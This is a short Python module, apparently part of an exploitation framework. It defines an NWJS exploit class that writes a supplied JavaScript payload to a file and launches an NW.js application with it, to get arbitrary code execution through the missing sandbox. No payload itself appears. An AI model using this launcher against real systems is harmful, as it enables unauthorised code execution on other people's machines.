"""
nwjs.py: Arbitrary Code Execution through NWJS thanks to lack of sandboxing
"""

import logging
import subprocess

from .base import Exploit


class NWJS(Exploit):

    def run(self):
        """
        Run the exploit
        """
        logging.info(f"Running exploit on {self._exploitable_application}")
        logging.info(f"JavaScript payload: {self._javascript_payload}")

        self._convert_javascript_payload_to_file(self._javascript_payload)
        subprocess.run(
            [self._exploitable_application, self._exploit_file.name],
        )